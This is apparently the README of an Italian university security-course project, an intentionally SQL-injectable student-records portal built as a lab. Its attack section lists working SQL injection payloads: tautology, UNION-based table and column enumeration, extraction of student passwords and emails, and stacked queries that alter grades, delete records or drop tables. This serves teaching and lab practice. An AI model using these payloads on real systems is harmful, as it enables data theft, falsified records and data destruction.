## Introduzione
Progetto per il corso Sicurezza appartenente alla triennale in Informatica de La Sapienza Università di Roma.
Si tratta di una piattaforma che permette agli studenti di vedere i progressi della propria carriera accademica, con informazioni riguardanti gli appelli prenotabili, gli appelli prenotati, gli esami superati e registrati e i propri dati anagrafici.
## SQL-injection
L’SQL Injection (SQLi) rappresenta una delle vulnerabilità informatiche più critiche e diffuse nell’ambito
della sicurezza delle applicazioni Web. Questa tecnica di code injection permette a un utente non autorizzato di manipolare l’input fornito a un’applicazione, forzandola a eseguire istruzioni SQL non previste
sul database sottostante.
### Progetto
<p> Il progetto `e stato sviluppato utilizzando le seguenti tecnologie: <br>
• Backend: Go, MySQL <br>
• Frontend: Vue.js <br>
• Docker <br>
Il sito è stato creato basandosi sul template di Fantastic coffee (decaffeinated); <br>
Abbiamo cercato di rimanere fedeli il più possibile agli standard del template, abbiamo solo fatto una modifica: <br>
al posto di SQLite, usiamo MySQL. </p>

### attacchi possibili:

Il progetto è sostanzialmente un laboratorio libero dove testare gli effetti di un attacco di tipo SQL-Injection.

- Tautologia

```jsx
' OR '1'='1
```

- UNION SELECT per nomi tabelle del database (appelli)

```jsx
' UNION SELECT 0, table_name, 'vuoto' , 'vuoto' FROM information_schema.tables WHERE table_schema = DATABASE() #
```

- UNION SELECT per colonne di una tabella (appelli)

```jsx
' UNION SELECT 0, column_name, 'vuoto', 'vuoto' FROM information_schema.columns WHERE table_name = 'tabella' #
```

- UNION SELECT per esfiltrazione del contenuto di una tabella (prenotazioni_esame)

```jsx
' UNION SELECT 1, matricola, nome, cognome, password, email FROM students #
```

- Query Piggybacked per rimpiazzo valori tabella

```jsx
' ; UPDATE prenotazioni_esami SET aula = 'Laboratori 1' WHERE id_prenotazione = 7; #
' ; UPDATE prenotazioni_esami SET aula = 'Aula 3' WHERE id_prenotazione = 6 or id_prenotazione = 7; #
' ; UPDATE libretto_esami SET voto = 30 WHERE insegnamento = 'Ricerca Operativa'; #
```

- Query PiggyBacked per eliminazione di entry di tabelle

```jsx
' ; DELETE FROM prenotazioni_esami WHERE aula= 'Laboratori 1'; #
' ; DELETE FROM libretto_esami WHERE insegnamento = 'Ricerca Operativa'; #
' ; DROP TABLE libretto_esami; #
```
  
